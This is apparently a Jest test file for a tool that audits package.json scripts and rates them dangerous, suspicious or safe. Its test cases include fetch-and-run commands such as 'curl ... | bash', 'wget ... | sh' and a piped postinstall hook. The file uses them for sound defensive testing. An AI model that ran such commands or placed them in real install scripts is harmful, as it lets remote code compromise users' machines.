import {
  classifyScriptRisk,
  buildScriptEntry,
  auditScripts,
  summarizeScriptsAudit,
} from './scripts-auditor';
import { PackageJson } from '../types';

function makePackage(name: string, scripts: Record<string, string>) {
  return { name, packageJson: { name, version: '1.0.0', scripts } as PackageJson };
}

describe('classifyScriptRisk', () => {
  it('marks curl pipe as dangerous', () => {
    const result = classifyScriptRisk('curl https://example.com/install.sh | bash');
    expect(result.risk).toBe('dangerous');
    expect(result.reason).toMatch(/curl/);
  });

  it('marks wget pipe as dangerous', () => {
    const result = classifyScriptRisk('wget -O- https://example.com | sh');
    expect(result.risk).toBe('dangerous');
  });

  it('marks eval as dangerous', () => {
    const result = classifyScriptRisk('node -e "eval(something)"');
    expect(result.risk).toBe('dangerous');
  });

  it('marks postinstall hook as suspicious', () => {
    const result = classifyScriptRisk('node scripts/postinstall.js');
    expect(result.risk).toBe('suspicious');
  });

  it('marks inline node execution as suspicious', () => {
    const result = classifyScriptRisk('node -e "console.log(1)"');
    expect(result.risk).toBe('suspicious');
  });

  it('marks base64 usage as suspicious', () => {
    const result = classifyScriptRisk('echo aGVsbG8= | base64 --decode');
    expect(result.risk).toBe('suspicious');
  });

  it('marks plain build scripts as safe', () => {
    const result = classifyScriptRisk('tsc --build');
    expect(result.risk).toBe('safe');
    expect(result.reason).toBeUndefined();
  });

  it('marks test scripts as safe', () => {
    const result = classifyScriptRisk('jest --coverage');
    expect(result.risk).toBe('safe');
  });
});

describe('buildScriptEntry', () => {
  it('builds a safe entry', () => {
    const entry = buildScriptEntry('build', 'tsc');
    expect(entry.name).toBe('build');
    expect(entry.command).toBe('tsc');
    expect(entry.risk).toBe('safe');
  });

  it('includes reason for dangerous entry', () => {
    const entry = buildScriptEntry('install', 'curl https://x.com | bash');
    expect(entry.risk).toBe('dangerous');
    expect(entry.reason).toBeDefined();
  });
});

describe('auditScripts', () => {
  it('returns results for each package', () => {
    const pkgs = [
      makePackage('safe-pkg', { build: 'tsc', test: 'jest' }),
      makePackage('risky-pkg', { postinstall: 'curl https://x.com | bash' }),
    ];
    const results = auditScripts(pkgs);
    expect(results).toHaveLength(2);
    expect(results[0].hasDangerousScripts).toBe(false);
    expect(results[1].hasDangerousScripts).toBe(true);
  });

  it('handles packages with no scripts', () => {
    const pkgs = [makePackage('empty-pkg', {})];
    const results = auditScripts(pkgs);
    expect(results[0].scripts).toHaveLength(0);
    expect(results[0].hasDangerousScripts).toBe(false);
  });
});

describe('summarizeScriptsAudit', () => {
  it('counts dangerous, suspicious, and safe packages', () => {
    const pkgs = [
      makePackage('a', { build: 'tsc' }),
      makePackage('b', { postinstall: 'node -e "x"' }),
      makePackage('c', { install: 'curl https://x.com | bash' }),
    ];
    const summary = summarizeScriptsAudit(auditScripts(pkgs));
    expect(summary.safe).toBe(1);
    expect(summary.suspicious).toBe(1);
    expect(summary.dangerous).toBe(1);
  });
});
